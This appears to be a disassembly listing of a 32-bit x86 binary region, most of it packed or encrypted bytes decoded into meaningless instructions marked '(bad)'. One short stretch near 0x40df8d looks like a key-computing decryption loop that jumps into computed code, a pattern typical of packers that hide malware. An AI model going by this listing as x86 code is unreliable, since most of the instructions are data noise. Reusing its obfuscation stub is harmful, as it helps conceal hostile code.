  40dae1:	xchg   BYTE PTR [eax],al
  40dae3:	push   ebx
  40dae4:	jae    0x40da8b
  40dae6:	sbb    eax,0xd0c6a70c
  40daeb:	aad    0x34
  40daed:	or     ebx,DWORD PTR [ecx]
  40daef:	hlt    
  40daf0:	(bad)  
  40daf1:	cdq    
  40daf2:	add    al,0x74
  40daf4:	std    
  40daf5:	retf   0x4238
  40daf8:	and    ah,BYTE PTR [edx]
  40dafa:	(bad)  
  40dafc:	and    BYTE PTR [eax+edx*2],ch
  40daff:	fnstsw WORD PTR [esi+0x1e]
  40db02:	pop    ds
  40db03:	pop    ds
  40db04:	and    ah,BYTE PTR [edi+0x6f]
  40db07:	sbb    DWORD PTR [ebp+0x7f2a907c],edx
  40db0d:	cmp    al,0x4d
  40db0f:	lds    edx,FWORD PTR [edi-0x68]
  40db12:	(bad)  
  40db13:	shr    BYTE PTR [edi+0x7957deb7],1
  40db19:	lea    esi,[ecx+0x3]
  40db1c:	add    eax,0xc3f745b8
  40db21:	cmp    ah,BYTE PTR [ebp+0x3fffbdfc]
  40db27:	repz push es
  40db29:	or     al,0xa
  40db2b:	add    DWORD PTR [ecx+0xdc39fe7],0x4a
  40db32:	add    eax,0xcec9a8b
  40db37:	jmp    0x202c9c75
  40db3c:	jmp    0x40db75
  40db3e:	mov    esp,0x6a0884b5
  40db43:	call   0x54516f47
  40db48:	jle    0x40db89
  40db4a:	or     BYTE PTR [edx+0x1d],dh
  40db4d:	neg    DWORD PTR [edx-0x4b]
  40db50:	call   0xea13a3d1
  40db55:	mov    cs,WORD PTR [ebx]
  40db57:	cwde   
  40db58:	dec    edi
  40db59:	imul   edx,DWORD PTR gs:[edi-0x56],0xdf521420
  40db61:	fucomip st,st(7)
  40db63:	push   ebx
  40db64:	or     al,0x72
  40db66:	mov    ch,0xd8
  40db68:	test   BYTE PTR [eax-0x28e70cfa],0xb9
  40db6f:	sub    al,0xb2
  40db71:	jg     0x40db84
  40db73:	adc    DWORD PTR [ecx],ebp
  40db75:	out    dx,al
  40db76:	mov    ah,0x5e
  40db78:	out    0x43,al
  40db7a:	or     BYTE PTR [edx],ah
  40db7c:	test   al,0x58
  40db7e:	cmp    eax,0x19861ec9
  40db83:	ret    
  40db84:	fwait
  40db85:	mov    ds:0x33c927dc,al
  40db8a:	mov    ds:0x9a9468b5,eax
  40db8f:	xabort 0x87
  40db92:	retf   
  40db93:	inc    ebp
  40db94:	jae    0x40dc15
  40db96:	mov    dl,0xe7
  40db98:	outs   dx,DWORD PTR ds:[esi]
  40db99:	sub    al,0xd
  40db9b:	fcom   QWORD PTR cs:[ebp-0x3f1617c8]
  40dba2:	(bad)  
  40dba3:	ss scas eax,DWORD PTR es:[edi]
  40dba5:	or     ebp,DWORD PTR [edx+0x6b]
  40dba8:	adc    dh,cl
  40dbaa:	and    eax,0xe7b5cf4e
  40dbaf:	sub    al,BYTE PTR [edx]
  40dbb1:	dec    ecx
  40dbb2:	(bad)  
  40dbb4:	xor    ebx,ebp
  40dbb6:	fiadd  DWORD PTR [ebp+eiz*2+0x76]
  40dbba:	fmul   QWORD PTR [ebx]
  40dbbc:	lods   eax,DWORD PTR ds:[esi]
  40dbbd:	pop    ss
  40dbbe:	loopne 0x40dba0
  40dbc0:	scas   al,BYTE PTR es:[edi]
  40dbc1:	xor    DWORD PTR [edi],esp
  40dbc3:	xchg   edi,eax
  40dbc4:	lea    ebx,[edx+ebp*4-0x5a5337c2]
  40dbcb:	inc    ebp
  40dbcc:	mov    eax,0x4e5ccd61
  40dbd1:	hlt    
  40dbd2:	jbe    0x40db5b
  40dbd4:	pop    ss
  40dbd5:	pop    edx
  40dbd6:	sub    al,0xd8
  40dbd8:	xor    BYTE PTR [edx-0x5b],ah
  40dbdb:	sub    DWORD PTR [esp+esi*4-0x7b009aa4],ecx
  40dbe2:	xchg   ebp,eax
  40dbe3:	fadd   DWORD PTR [ebx+0x77]
  40dbe6:	fbstp  TBYTE PTR [ebp-0x1f6cfdd]
  40dbec:	lds    esp,FWORD PTR [edi+0x867a071]
  40dbf2:	inc    esp
  40dbf3:	int    0xa2
  40dbf5:	sar    DWORD PTR ds:0xab58c438,cl
  40dbfb:	aad    0x26
  40dbfd:	mov    WORD PTR [edi-0xec406d7],ss
  40dc03:	xchg   esp,eax
  40dc04:	sbb    DWORD PTR [ebp+0x48],esp
  40dc07:	and    dl,cl
  40dc09:	and    eax,0xcb8ee9c1
  40dc0e:	retf   0x73b2
  40dc11:	cmp    bh,BYTE PTR [edx+0xe705315]
  40dc17:	mov    ecx,0x294c9b38
  40dc1c:	(bad)  
  40dc1d:	push   ecx
  40dc1e:	xor    ah,BYTE PTR [edx-0x40eeade7]
  40dc24:	pop    esp
  40dc25:	jno    0x40dc8e
  40dc27:	cmp    eax,0x9d8a456b
  40dc2c:	cmc    
  40dc2d:	iret   
  40dc2e:	jmp    0x40dc5f
  40dc30:	pushf  
  40dc31:	into   
  40dc32:	imul   ebx,DWORD PTR [ebp-0x2],0x6a
  40dc36:	jle    0x40dc70
  40dc38:	shl    BYTE PTR [edi+0x10],0x83
  40dc3c:	push   ss
  40dc3d:	and    ch,ah
  40dc3f:	pop    esi
  40dc40:	aas    
  40dc41:	cmp    eax,0xfb838983
  40dc46:	and    al,0xfa
  40dc48:	mov    ecx,0x99a44ed2
  40dc4d:	sub    ecx,DWORD PTR [esi+0x411949bb]
  40dc53:	pop    ds
  40dc54:	popa   
  40dc55:	dec    eax
  40dc56:	ins    DWORD PTR es:[edi],dx
  40dc57:	or     DWORD PTR [ebp-0x13],ebp
  40dc5a:	jae    0x40dc67
  40dc5c:	std    
  40dc5d:	add    al,0xc6
  40dc5f:	imul   ebx,DWORD PTR [edx-0x746042c4],0x55
  40dc66:	or     BYTE PTR [ebx+0x1be9dc7d],cl
  40dc6c:	add    eax,DWORD PTR [eax]
  40dc6e:	add    dl,dh
  40dc70:	cmp    al,0x15
  40dc72:	adc    al,0x31
  40dc74:	aad    0xf3
  40dc76:	fcom   DWORD PTR [eax*8+0x30f4c898]
  40dc7d:	or     BYTE PTR [ebx+0x35],bl
  40dc80:	call   0x7e7e:0x7d7d7e7e
  40dc87:	outs   dx,BYTE PTR ds:[esi]
  40dc88:	nop
  40dc89:	stc    
  40dc8a:	cs into 
  40dc8c:	test   eax,0xd1ec0bf0
  40dc91:	push   edi
  40dc92:	or     al,0x12
  40dc94:	lods   eax,DWORD PTR ds:[esi]
  40dc95:	and    ch,BYTE PTR [eax+0x24]
  40dc98:	cmp    DWORD PTR ds:0x27b6b4b3,edi
  40dc9e:	and    bl,bl
  40dca0:	push   edx
  40dca1:	cmp    DWORD PTR [ebp-0x3d],0xc447fd7f
  40dca8:	jo     0x40dc96
  40dcaa:	mov    BYTE PTR [esp+ebx*2-0x35],bh
  40dcae:	or     ebx,esi
  40dcb0:	mov    bh,bh
  40dcb2:	mov    bh,0xcb
  40dcb4:	fstp   st(6)
  40dcb6:	or     al,0x1a
  40dcb8:	jg     0x40dc66
  40dcba:	repz dec edx
  40dcbc:	fstp   DWORD PTR [edx]
  40dcbe:	out    dx,al
  40dcbf:	jp     0x40dcde
  40dcc1:	mov    edi,0xa49528dc
  40dcc6:	outs   dx,BYTE PTR ds:[esi]
  40dcc7:	mov    ecx,0x9af8ab14
  40dccc:	ror    DWORD PTR [eax+0x17c2787d],1
  40dcd2:	push   ecx
  40dcd3:	into   
  40dcd4:	xchg   BYTE PTR [esp+ebp*2],dh
  40dcd7:	addr16 mov esi,0x494ef82d
  40dcdd:	cld    
  40dcde:	mov    al,ds:0xa592aa53
  40dce3:	mov    cl,0x47
  40dce5:	imul   ebx,DWORD PTR [eax+0x3b],0x9f2020fb
  40dcec:	jae    0x40dcdf
  40dcee:	std    
  40dcef:	(bad)  
  40dcf1:	add    DWORD PTR [eax-0xb],0xffffffba
  40dcf5:	popa   
  40dcf6:	ds push cs
  40dcf8:	sar    DWORD PTR [ebp-0x18],1
  40dcfb:	dec    edx
  40dcfc:	call   0xcf99:0x209e271e
  40dd03:	xchg   esp,eax
  40dd04:	xor    bl,0x11
  40dd07:	cs jb  0x40dcd4
  40dd0a:	jns    0x40dcab
  40dd0c:	sbb    al,0x1a
  40dd0e:	push   ebp
  40dd0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd10:	lds    edx,FWORD PTR [ebp+eax*4-0x17]
  40dd14:	pop    ss
  40dd15:	pop    eax
  40dd16:	jae    0x40dd8b
  40dd18:	sbb    al,BYTE PTR ds:0x53747a5
  40dd1e:	adc    BYTE PTR [ebx-0x3b],bl
  40dd21:	bnd je 0x40dd98
  40dd24:	mov    ecx,0x80bc62a1
  40dd29:	in     al,0x38
  40dd2b:	into   
  40dd2c:	push   ecx
  40dd2d:	push   cs
  40dd2e:	jne    0x40dd73
  40dd30:	sti    
  40dd31:	xchg   edx,eax
  40dd32:	clc    
  40dd33:	jo     0x40dd65
  40dd35:	mov    esi,0x3a38b701
  40dd3a:	repnz mov ds:0x92a9d482,eax
  40dd40:	mov    dl,0xfe
  40dd42:	btc    DWORD PTR [esi],ecx
  40dd45:	sub    cl,ah
  40dd47:	jmp    0xda98:0x2336a19d
  40dd4e:	sbb    eax,0x2ed48ea2
  40dd53:	and    DWORD PTR [eax+ebx*2-0x3f],edx
  40dd57:	dec    ecx
  40dd58:	popf   
  40dd59:	enter  0x5e29,0x83
  40dd5d:	mov    edi,0x8a89eae1
  40dd62:	(bad)  
  40dd64:	xor    DWORD PTR [ebx+0x41],esi
  40dd67:	add    al,0x27
  40dd69:	sub    eax,edx
  40dd6b:	aam    0x26
  40dd6d:	sar    BYTE PTR [esi],cl
  40dd6f:	mov    eax,ds:0x84b0166d
  40dd74:	cmc    
  40dd75:	sbb    BYTE PTR [eax-0x4],dl
  40dd78:	aaa    
  40dd79:	imul   edx,DWORD PTR [esi-0x7df6365],0x17
  40dd80:	outs   dx,DWORD PTR ds:[esi]
  40dd81:	jo     0x40dd8b
  40dd83:	imul   esi,DWORD PTR [ecx+0x77cdecaa],0xffffffb8
  40dd8a:	inc    ebp
  40dd8b:	lea    esp,[ebx]
  40dd8d:	sbb    esp,esi
  40dd8f:	xchg   ebp,eax
  40dd90:	loop   0x40dd9c
  40dd92:	imul   ebx,DWORD PTR [esi+0x56],0x9b528093
  40dd99:	scas   eax,DWORD PTR es:[edi]
  40dd9a:	das    
  40dd9b:	idiv   BYTE PTR [esp+edx*4+0x37]
  40dd9f:	icebp  
  40dda0:	pop    edi
  40dda1:	mov    edi,0xa7bc92b2
  40dda6:	ds fwait
  40dda8:	icebp  
  40dda9:	jo     0x40ddb3
  40ddab:	push   es
  40ddac:	(bad)  
  40ddad:	clc    
  40ddae:	inc    edi
  40ddaf:	mov    dh,0xf
  40ddb2:	jmp    0x40ddb0
  40ddb4:	and    al,0xfd
  40ddb6:	(bad)  [esi]
  40ddb8:	fsub   QWORD PTR [edi+0x5070b6f9]
  40ddbe:	pop    ecx
  40ddbf:	(bad)  
  40ddc0:	xchg   ebx,esi
  40ddc2:	mov    eax,0xd405aca7
  40ddc7:	sti    
  40ddc8:	hlt    
  40ddc9:	adc    ecx,ebp
  40ddcb:	cs adc ecx,esp
  40ddce:	popa   
  40ddcf:	(bad)  
  40ddd0:	ins    DWORD PTR es:[edi],dx
  40ddd1:	xchg   BYTE PTR [ebp+ecx*4+0x27],dl
  40ddd5:	pop    esi
  40ddd6:	call   0xae023d2b
  40dddb:	mov    ah,0xd6
  40dddd:	shl    DWORD PTR [ecx-0x345a2dac],cl
  40dde3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dde4:	sbb    eax,0xbf537f83
  40dde9:	dec    eax
  40ddea:	ficom  WORD PTR [edx+0x4c]
  40dded:	idiv   BYTE PTR [ecx+0xff3bfae]
  40ddf3:	shl    BYTE PTR [edi+eiz*8+0x5e],1
  40ddf7:	lahf   
  40ddf8:	mov    ds:0x1a87f1a9,eax
  40ddfd:	ds jo  0x40de75
  40de00:	sti    
  40de01:	sub    al,0x44
  40de03:	xor    ch,dl
  40de05:	jnp    0x40de51
  40de07:	push   edi
  40de08:	lods   al,BYTE PTR ds:[esi]
  40de09:	cli    
  40de0a:	or     DWORD PTR [esi-0x7],esi
  40de0d:	(bad)  
  40de0e:	jecxz  0x40de3a
  40de10:	cmp    eax,esi
  40de12:	xor    eax,0xea3ac753
  40de17:	cli    
  40de18:	mov    bh,0x23
  40de1a:	xor    ch,BYTE PTR [esi+0x9a34814]
  40de20:	stc    
  40de21:	jp     0x40ddc6
  40de23:	sar    dh,0x93
  40de26:	sbb    DWORD PTR [ecx+0x62004543],eax
  40de2c:	mov    DWORD PTR [ecx+0x433d6556],0x370af9c4
  40de36:	dec    eax
  40de37:	jecxz  0x40ddfd
  40de39:	pusha  
  40de3a:	pop    ss
  40de3b:	mov    ecx,0xc052c4a
  40de40:	inc    ebx
  40de41:	inc    esi
  40de42:	sahf   
  40de43:	xor    DWORD PTR [eax+0x6d368b36],esi
  40de49:	imul   edx
  40de4b:	daa    
  40de4c:	cmp    eax,0x978560e0
  40de51:	push   edx
  40de52:	pop    ecx
  40de53:	fwait
  40de54:	mov    WORD PTR [edx],gs
  40de56:	call   ebp
  40de58:	out    0xf3,al
  40de5a:	jo     0x40de65
  40de5c:	jecxz  0x40dde3
  40de5e:	rol    DWORD PTR [ecx+0x69eb200f],0x22
  40de65:	mov    ecx,0x2f10b651
  40de6a:	jbe    0x40de9f
  40de6c:	aam    0x95
  40de6e:	call   esp
  40de70:	ja     0x40dea1
  40de72:	lahf   
  40de73:	mov    esi,0xb1b83edc
  40de78:	mov    edi,0x3bfb53d9
  40de7d:	jl     0x40de1a
  40de7f:	cwde   
  40de80:	push   ebp
  40de81:	and    al,BYTE PTR [esi]
  40de83:	xor    eax,0xbf22d1d8
  40de88:	mov    dh,0x43
  40de8a:	rol    BYTE PTR ds:0x10a5411f,cl
  40de90:	push   edx
  40de91:	mov    ch,0x82
  40de93:	xchg   edi,eax
  40de94:	or     eax,DWORD PTR [ebx+0xb]
  40de97:	mov    al,ds:0x738b2e88
  40de9c:	mov    WORD PTR [edx],fs
  40de9e:	mov    cl,BYTE PTR [ecx+0x7803551e]
  40dea4:	adc    BYTE PTR [edi-0x64],dh
  40dea7:	jbe    0x40def0
  40dea9:	icebp  
  40deaa:	inc    edx
  40deab:	int3   
  40deac:	cmp    ebx,DWORD PTR [eax]
  40deae:	fcom   DWORD PTR cs:[eax+0x5a]
  40deb2:	jmp    0x40dec5
  40deb4:	pop    es
  40deb5:	jl     0x40de7a
  40deb7:	sar    BYTE PTR [ebx+0x4b],0xc2
  40debb:	addr16 aaa 
  40debd:	je     0x40de42
  40debf:	aaa    
  40dec0:	or     DWORD PTR [edi-0x1b],ecx
  40dec3:	push   esp
  40dec4:	fild   QWORD PTR [esi]
  40dec6:	in     eax,dx
  40dec7:	mov    ebx,DWORD PTR [edi-0x225d590]
  40decd:	sbb    esp,DWORD PTR [eax]
  40decf:	in     al,dx
  40ded0:	pop    edi
  40ded1:	leave  
  40ded2:	mov    bl,0x2d
  40ded4:	lods   eax,DWORD PTR ds:[esi]
  40ded5:	sbb    esp,ebp
  40ded7:	cld    
  40ded8:	xorps  xmm2,XMMWORD PTR [edx]
  40dedb:	dec    ebx
  40dedc:	mov    ah,0x61
  40dede:	ja     0x40de83
  40dee0:	jno    0x40de74
  40dee2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dee3:	leave  
  40dee4:	loopne 0x40df56
  40dee6:	lea    edx,[eax-0x641fd403]
  40deec:	scas   al,BYTE PTR es:[edi]
  40deed:	lds    esp,FWORD PTR [edi]
  40deef:	test   al,0xc4
  40def1:	rcr    BYTE PTR [eax+0x1e],1
  40def4:	add    dl,BYTE PTR [edx-0x3b]
  40def7:	sub    edx,ebx
  40def9:	adc    DWORD PTR ds:0x1da828c5,edx
  40deff:	mov    bl,0xac
  40df01:	in     eax,dx
  40df02:	add    ebp,DWORD PTR [ebp-0x2]
  40df05:	adc    eax,0xa2722861
  40df0a:	call   ecx
  40df0c:	scas   eax,DWORD PTR es:[edi]
  40df0d:	inc    ebp
  40df0e:	icebp  
  40df0f:	in     al,dx
  40df10:	dec    eax
  40df11:	stos   DWORD PTR es:[edi],eax
  40df12:	jmp    0xb218c193
  40df17:	pop    DWORD PTR [ecx-0x6d798183]
  40df1d:	or     eax,DWORD PTR [ecx]
  40df1f:	loop   0x40deb0
  40df21:	rcl    DWORD PTR [edi-0x6e067bb7],0xd1
  40df28:	in     eax,0xaa
  40df2a:	(bad)  
  40df2b:	cmc    
  40df2c:	fisub  WORD PTR [esi-0x71]
  40df2f:	add    edi,DWORD PTR [ecx+0x5f4bd03c]
  40df35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df36:	pop    esi
  40df37:	les    ecx,FWORD PTR [edx-0x66f54fa5]
  40df3d:	in     al,0x4d
  40df3f:	rcl    BYTE PTR [edx-0x5d91537a],0x31
  40df46:	ins    BYTE PTR es:[edi],dx
  40df47:	lahf   
  40df48:	sbb    eax,0x982e897d
  40df4d:	mov    esp,0x4f2167cb
  40df52:	jno    0x40df35
  40df54:	mov    al,ds:0xb76e4cca
  40df59:	icebp  
  40df5a:	loope  0x40df99
  40df5c:	retf   0x22c1
  40df5f:	stc    
  40df60:	pop    ds
  40df61:	adc    DWORD PTR [edi],esp
  40df63:	mov    dh,0xea
  40df65:	(bad)  
  40df66:	mov    ebx,0x9c6986b1
  40df6b:	inc    ebx
  40df6c:	fild   DWORD PTR [edi+0x22]
  40df6f:	push   es
  40df70:	outs   dx,DWORD PTR ds:[esi]
  40df71:	(bad)  
  40df72:	adc    esp,eax
  40df74:	test   ah,cl
  40df76:	dec    ecx
  40df77:	into   
  40df78:	in     al,dx
  40df79:	xor    al,0xe1
  40df7b:	lea    esi,[esi]
  40df7d:	pop    esp
  40df7e:	mov    dl,0xd6
  40df80:	std    
  40df81:	push   0x8d57d2e9
  40df86:	rcr    ch,cl
  40df88:	mov    edx,0x970489e1
  40df8d:	mov    eax,DWORD PTR [ebp-0x18]
  40df90:	mov    edx,DWORD PTR [ebp+0x8]
  40df93:	xor    eax,ecx
  40df95:	lea    eax,[eax+edx*1+0x32729b]
  40df9c:	mov    DWORD PTR [ebp+0x8],eax
  40df9f:	mov    eax,DWORD PTR [ebp-0x18]
  40dfa2:	mov    edx,DWORD PTR [ebp+0x14]
  40dfa5:	xor    eax,ecx
  40dfa7:	add    eax,esi
  40dfa9:	imul   eax,DWORD PTR [edx]
  40dfac:	mov    edx,DWORD PTR [ebp-0x4]
  40dfaf:	xor    edx,ecx
  40dfb1:	mov    ecx,DWORD PTR [ebp+0x8]
  40dfb4:	lea    ecx,[edx+ecx*1+0x32729b]
  40dfbb:	cmp    ecx,eax
  40dfbd:	jne    0x40d5f9
  40dfc3:	mov    ebx,esi
  40dfc5:	jmp    0x40dfcf
  40dfca:	mov    ebx,0x32729b
  40dfcf:	mov    eax,DWORD PTR [ebp-0x4]
  40dfd2:	xor    eax,0x7510854
  40dfd7:	add    eax,ebx
  40dfd9:	mov    DWORD PTR [ebp-0xc],eax
  40dfdc:	xor    ebx,ebx
  40dfde:	lea    eax,[ebp-0x10]
  40dfe1:	add    ebx,DWORD PTR [eax]
  40dfe3:	call   ebx
  40dfe5:	xor    ebx,ebx
  40dfe7:	inc    ebx
  40dfe8:	cmp    DWORD PTR [ebp+0x10],ebx
  40dfeb:	je     0x40e009
  40dff1:	xchg   edx,eax
  40dff2:	push   0xa
  40dff4:	pop    ecx
  40dff5:	push   0x4
  40dff7:	pop    ebx
  40dff8:	inc    ebx
  40dff9:	xchg   ebx,ecx
  40dffb:	sub    ebx,ecx
  40dffd:	xchg   ebx,ecx
  40dfff:	dec    ecx
  40e000:	mov    eax,DWORD PTR [ebp-0x1c]
  40e003:	imul   eax,ecx
  40e006:	add    esp,eax
  40e008:	xchg   edx,eax
  40e009:	push   eax
  40e00a:	xor    ebx,ebx
  40e00c:	mov    edx,esp
  40e00e:	dec    edx
  40e00f:	inc    ebx
  40e010:	add    ebx,DWORD PTR [edx+ebx*1]
  40e013:	jmp    0x40e333
  40e018:	lods   al,BYTE PTR ds:[esi]
  40e019:	and    bl,bl
  40e01b:	xchg   esp,eax
  40e01c:	jno    0x40e073
  40e01e:	jno    0x40e042
  40e020:	add    cl,cl
  40e022:	pmullw mm5,QWORD PTR cs:[ebp-0x6]
  40e027:	mov    dh,0x30
  40e029:	cdq    
  40e02a:	jle    0x40e0aa
  40e02c:	jge    0x40e0ab
  40e02e:	jle    0x40e0ae
  40e030:	imul   edx,DWORD PTR [eax+0x595072c6],0x185204ba
  40e03a:	and    eax,0x6f2ce30c
  40e03f:	retf   0x7737
  40e042:	nop
  40e043:	cdq    
  40e044:	sahf   
  40e045:	lods   al,BYTE PTR ds:[esi]
  40e046:	mov    dl,0xbd
  40e048:	hlt    
  40e049:	out    0x40,eax
  40e04b:	je     0x40e06d
  40e04d:	cli    
  40e04e:	dec    esi
  40e04f:	sbb    eax,0xb352d79f
  40e054:	lea    ebx,[ecx]
  40e056:	jp     0x40dfe2
  40e058:	sbb    ecx,DWORD PTR [eax+0x4e5913b3]
  40e05e:	ret    
  40e05f:	stos   DWORD PTR es:[edi],eax
  40e060:	sbb    ah,BYTE PTR [edx]
  40e062:	xchg   bl,bh
  40e064:	push   ebp
  40e065:	mov    ch,0x5
  40e067:	adc    cl,BYTE PTR [eax-0x105d0b73]
  40e06d:	push   ecx
  40e06e:	push   ds
  40e06f:	cmp    eax,0x654db25d
  40e074:	aas    
  40e075:	mov    edi,0x6413783f
  40e07a:	mov    bh,0xb7
  40e07c:	outs   dx,DWORD PTR ds:[esi]
  40e07d:	or     DWORD PTR ds:[eax-0x1],esi
  40e081:	mov    al,0x32
  40e083:	pop    ds
  40e084:	(bad)  
  40e085:	outs   dx,DWORD PTR ds:[esi]
  40e086:	stos   DWORD PTR es:[edi],eax
  40e087:	mov    fs,WORD PTR [esi]
  40e089:	add    esi,DWORD PTR [ebx+0x14]
  40e08c:	nop
  40e08d:	inc    esi
  40e08e:	and    DWORD PTR [edi-0x6f],ebp
  40e091:	mov    BYTE PTR [edx+0x53d2bafc],dh
  40e097:	leave  
  40e098:	sub    DWORD PTR [eax],esi
  40e09a:	jge    0x40e102
  40e09c:	xlat   BYTE PTR ds:[ebx]
  40e09d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e09e:	jno    0x40e10e
  40e0a0:	ret    0xeb74
  40e0a3:	sbb    bh,BYTE PTR [edi-0x45bda16c]
  40e0a9:	sub    BYTE PTR [esi],0x52
  40e0ac:	(bad)  
  40e0ad:	repz push cs
  40e0af:	cmp    eax,0xa5d85d86
  40e0b4:	fcom   DWORD PTR [eax-0x77]
  40e0b7:	sub    DWORD PTR ds:0x6764a56d,0xdc3caf29
  40e0c1:	push   ds
  40e0c2:	aaa    
  40e0c3:	gs scas eax,DWORD PTR es:[edi]
  40e0c5:	mov    ebp,0x908d3fd6
  40e0ca:	mov    bh,0x95
  40e0cc:	rol    ch,cl
  40e0ce:	dec    ecx
  40e0cf:	xor    cl,BYTE PTR [esi-0x10]
  40e0d2:	ins    DWORD PTR es:[edi],dx
  40e0d3:	(bad)  
  40e0d4:	dec    ebp
  40e0d5:	or     DWORD PTR ds:0x9f37b578,esi
  40e0db:	bound  edi,QWORD PTR [ebx]
  40e0dd:	pop    ecx
  40e0de:	sub    DWORD PTR [ebx+eax*1],esi
  40e0e1:	lea    ebx,[ecx+0x21a338a9]
  40e0e7:	out    0xc5,al
  40e0e9:	push   ss
  40e0ea:	pop    ebp
  40e0eb:	and    dl,BYTE PTR [edi]
  40e0ed:	je     0x40e0d9
  40e0ef:	(bad)  
  40e0f0:	rcr    DWORD PTR ds:0xe527e95c,cl
  40e0f6:	xor    ebp,edx
  40e0f8:	sahf   
  40e0f9:	cmp    BYTE PTR [edi],al
  40e0fb:	pop    ebx
  40e0fc:	fimul  WORD PTR [ebx-0x11]
  40e0ff:	retf   
  40e100:	loope  0x40e0e6
  40e102:	inc    edi
  40e103:	lods   eax,DWORD PTR ds:[esi]
  40e104:	retf   
  40e105:	cmc    
  40e106:	(bad)  
  40e107:	sub    ebx,DWORD PTR [ecx+esi*8+0x51]
  40e10b:	pop    ebp
  40e10c:	jge    0x40e121
  40e10e:	cwde   
  40e10f:	test   eax,0x818a6ff9
  40e114:	jp     0x40e0fc
  40e116:	xor    eax,0x37ded115
  40e11b:	clflush BYTE PTR [edx]
  40e11e:	inc    eax
  40e11f:	imul   eax,DWORD PTR [edx+0x1df5c287],0xf953d7b
  40e129:	jmp    0x40e0e6
  40e12b:	out    dx,ax
  40e12d:	fwait
  40e12e:	into   
  40e12f:	dec    ecx
  40e130:	(bad)  
  40e132:	out    0x97,al
  40e134:	add    eax,0xbe84bcc7
  40e139:	jae    0x40e11b
  40e13b:	or     BYTE PTR [ecx],bh
  40e13d:	mov    ?,WORD PTR [ebp-0x48c2aa3d]
  40e143:	arpl   WORD PTR [esi],bp
  40e145:	out    0x35,al
  40e147:	dec    ebx
  40e148:	pop    ecx
  40e149:	sub    BYTE PTR [ebx+0x63842305],bh
  40e14f:	mov    ah,dl
  40e151:	pusha  
  40e152:	inc    ebx
  40e153:	idiv   DWORD PTR [edx-0x18a30c4f]
  40e159:	or     eax,0x4248a6e8
  40e15e:	hlt    
  40e15f:	test   eax,0xd23d0f3d
  40e164:	repnz sbb BYTE PTR [edi+edx*2],0x33
  40e169:	jb     0x40e176
  40e16b:	arpl   WORD PTR [edi+0x62],bx
  40e16e:	js     0x40e149
  40e170:	(bad)  
  40e171:	cmp    cl,bl
  40e173:	hlt    
  40e174:	jg     0x40e11c
  40e176:	daa    
  40e177:	dec    esp
  40e178:	cwde   
  40e179:	sbb    eax,0xc1ec7f97
  40e17e:	icebp  
  40e17f:	mov    gs,edx
  40e181:	pusha  
  40e182:	mov    dh,BYTE PTR [ebx+0x3f565240]
  40e188:	inc    edx
  40e189:	mov    ds,WORD PTR [edi-0x63]
  40e18c:	pop    ds
  40e18d:	call   0x309466d5
  40e192:	and    ch,bl
  40e194:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e195:	xchg   BYTE PTR [eax-0x16],dh
  40e198:	sar    DWORD PTR [edx-0x5f],1
  40e19b:	push   eax
  40e19c:	xor    BYTE PTR [esi],al
  40e19e:	and    ebp,DWORD PTR [edx+0x37]
  40e1a1:	adc    BYTE PTR [ecx],0x1c
  40e1a4:	in     eax,0x9a
  40e1a6:	dec    esi
  40e1a7:	mov    ebp,es
  40e1a9:	or     al,0x47
  40e1ab:	into   
  40e1ac:	dec    eax
  40e1ad:	xlat   BYTE PTR ds:[ebx]
  40e1ae:	loop   0x40e1ef
  40e1b0:	popf   
  40e1b1:	sti    
  40e1b2:	fwait
  40e1b3:	adc    bh,BYTE PTR [edx+0x48]
  40e1b6:	stos   DWORD PTR es:[edi],eax
  40e1b7:	xor    ebx,esi
  40e1b9:	test   bl,bl
  40e1bb:	sbb    BYTE PTR [esi],dl
  40e1bd:	int    0x3c
  40e1bf:	mov    ebx,0xc5f36db9
  40e1c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1c5:	xchg   DWORD PTR [edi+0x6795e336],ecx
  40e1cb:	loope  0x40e1c4
  40e1cd:	xchg   ebp,eax
  40e1ce:	jmp    0x40e1dc
  40e1d0:	mov    esp,DWORD PTR [esi]
  40e1d2:	shr    BYTE PTR [ebp+0x41fb0941],cl
  40e1d8:	jnp    0x40e1dd
  40e1da:	mov    ah,0x3e
  40e1dc:	repz push 0xffffffc1
  40e1df:	in     al,0xce
  40e1e1:	jnp    0x40e18c
  40e1e3:	out    dx,al
  40e1e4:	les    eax,FWORD PTR [ebp+0x731478f3]
  40e1ea:	js     0x40e21d
  40e1ec:	add    al,0xec
  40e1ee:	push   ss
  40e1ef:	dec    ecx
  40e1f0:	xlat   BYTE PTR ds:[ebx]
  40e1f1:	jg     0x40e24b
  40e1f3:	(bad)  
  40e1f4:	out    dx,al
  40e1f5:	repz mov ch,0x1a
  40e1f8:	and    al,0x13
  40e1fa:	lods   al,BYTE PTR ds:[esi]
  40e1fb:	jbe    0x40e1dc
  40e1fd:	jecxz  0x40e1d8
  40e1ff:	sub    al,0xbd
  40e201:	xchg   DWORD PTR [edi+0x451bdaa2],eax
  40e207:	in     eax,0xae
  40e209:	xor    al,BYTE PTR [ecx-0x4c]
  40e20c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e20d:	clc    
  40e20e:	fndisi(8087 only) 
  40e210:	sti    
  40e211:	call   0xfebf:0x15bde6fc
  40e218:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e219:	fsubr  st(0),st
  40e21b:	or     al,0x72
  40e21d:	mov    ebx,0xf1315367
  40e222:	push   eax
  40e223:	lahf   
  40e224:	test   DWORD PTR [edi+ebp*2-0x502db46f],0xe6030f83
  40e22f:	jmp    0x40e1f6
  40e231:	add    al,0xe9
  40e233:	pop    edi
  40e234:	pop    es
  40e235:	pop    edx
  40e236:	mov    WORD PTR [edi-0x179f1bcd],?
  40e23c:	adc    DWORD PTR [esi+edx*1],edx
  40e23f:	xchg   DWORD PTR [ebx-0x24bcc58a],esi
  40e245:	dec    esp
  40e246:	sub    al,0x92
  40e248:	stos   BYTE PTR es:[edi],al
  40e249:	and    eax,0xf536fe71
  40e24e:	mov    ah,0xa7
  40e250:	push   ebx
  40e251:	leave  
  40e252:	test   DWORD PTR [ebx],ebp
  40e254:	aam    0xbf
  40e256:	(bad)  
  40e257:	push   ds
  40e258:	outs   dx,DWORD PTR ds:[esi]
